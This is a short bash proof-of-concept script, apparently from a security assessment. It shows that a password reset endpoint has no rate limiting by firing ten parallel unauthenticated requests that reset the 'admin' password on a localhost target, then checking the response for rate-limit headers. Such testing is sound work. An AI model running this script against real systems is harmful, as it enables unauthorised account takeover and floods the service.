#!/bin/bash

# POC: Missing Rate Limiting on Password Reset Endpoint
# Demonstrates that /internal/update endpoint accepts unlimited parallel requests
# without any rate limiting, throttling, or request rejection

TARGET="http://localhost:5000"
ENDPOINT="/internal/update"
USERNAME="admin"

echo "[*] Testing for Missing Rate Limiting on $TARGET$ENDPOINT"
echo "[*] Sending 10 parallel password reset requests..."
echo ""

# Function to send a single request and capture response time
send_request() {
    local request_num=$1
    local password="parallel_$request_num"
    
    START_TIME=$(date +%s%N)
    RESPONSE=$(curl -s "$TARGET$ENDPOINT?username=$USERNAME&newpassword=$password")
    END_TIME=$(date +%s%N)
    
    # Calculate elapsed time in milliseconds
    ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
    
    echo "[+] Request $request_num: Response='$RESPONSE' (${ELAPSED_MS}ms)"
    
    # Check if request was successful
    if [[ "$RESPONSE" == *"successfully"* ]]; then
        echo "    Status: SUCCESS"
    else
        echo "    Status: REJECTED/DELAYED"
    fi
}

# Send 5 requests in parallel batch 1
echo "=== Batch 1: 5 Parallel Requests ==="
for i in {1..5}; do
    send_request $i &
done
wait

echo ""
echo "=== Batch 2: 5 Parallel Requests ==="

# Send 5 requests in parallel batch 2
for i in {6..10}; do
    send_request $i &
done
wait

echo ""
echo "[*] Test Complete"
echo "[*] If all 10 requests completed immediately without delays or rejections,"
echo "    the endpoint lacks rate limiting protection."
echo ""

# Check for rate limiting headers
echo "[*] Checking for rate limiting headers..."
HEADER_RESPONSE=$(curl -s -i "$TARGET$ENDPOINT?username=$USERNAME&newpassword=test" 2>&1)
echo "$HEADER_RESPONSE" | grep -iE "(Retry-After|X-RateLimit|X-Rate-Limit)" && echo "    Rate limiting headers FOUND" || echo "    Rate limiting headers NOT FOUND"